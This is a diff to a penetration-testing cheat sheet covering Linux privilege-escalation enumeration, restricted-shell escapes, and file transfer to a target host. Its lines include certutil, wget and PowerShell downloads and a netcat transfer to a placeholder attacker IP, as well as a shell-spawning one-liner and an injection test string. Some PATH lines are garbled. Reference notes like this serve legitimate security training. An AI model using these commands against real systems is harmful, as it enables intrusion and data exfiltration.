@@ -149,8 +149,6 @@ Check if "SeImpersonatePrivilege" is enabled: `whoami /priv`<br/>
 
 
 # Privilege_Escalation_Linux
-Spawn a better shell (commands may work afterwards):
-`python -c 'import pty; pty.spawn("/bin/bash")'`
 ## Manual enumeration:
 Look for commands, that can be run without  password:`sudo -l` <br/>
 Get user context information:`id` <br/>
@@ -170,15 +168,6 @@ Drive informations: `cat /etc/fstab`, `mount`, `lsblk`  <br/>
 show loaded kernel modules: `lsmod`<br/>
 ## Automated enumeration:
 * linpeas.sh from https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh<br/>
-
-## SSH (22/tcp)
-* Commands from terminal not working ("-rbash: cd: restricted" or similar)<br/>
-Fix path:<br/>
-`export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:`<br/>
-Fix shell:<br/>
-`python -c 'import pty; pty.spawn("/bin/bash")' python -c 'import pty; pty.spawn("/bin/bash")'
-export PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
-/games"PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr`<br/>
 ## File transfer, upload to target:
 Start web server in the current directory on port 80:<br/>
 `python3 -m http.server 80`<br/>
@@ -187,7 +176,6 @@ Upload from victim:<br/>
 `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.xxx.xxx:80/some_file', 'c:\Users\Public\Downloads\some_file')"`<br/>
 ### wget
 `wget 192.168.xxx.xxx:80/some_file`<br/>
-Error message "Address is already in use" -> `lsof -i:80` and kill process.<br/>
 ### CertUtil.exe
 `certutil.exe -split -f 192.168.xxx.xxx:80/some_file`<br/>
 ### mshta 
@@ -203,16 +191,19 @@ Command on target: `nc.exe 192.168.xxx.xxx 443 -w 3 < report.html`<br/>
 Exploit mostly written in c.<br/>
 `gcc -o exploit EXPLOIT.c `<br/>
 # Solutions
-Python server can't be started because port is in use: `lsof -i:80` and kill corresponding app.<br/>
+Python server can't be started because port is in use (Address is already in use): `lsof -i:80` and kill corresponding app.<br/>
 Testing-string for sql-injection: `'">*)asdf-${{<%[%'"}}%\` <br/>
 Problem with python-packages:<br/>
 * Commands from terminal not working ("-rbash: cd: restricted" or similar)<br/>
 Fix path:<br/>
 `export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:`<br/>
-Fix shell:<br/>
-`python -c 'import pty; pty.spawn("/bin/bash")' python -c 'import pty; pty.spawn("/bin/bash")'
+Spawn shell:<br/>
+`python -c 'import pty; pty.spawn("/bin/bash")' 
+Fix path:<br/>
 export PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
 /games"PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr`<br/>
+
+
 
 
 
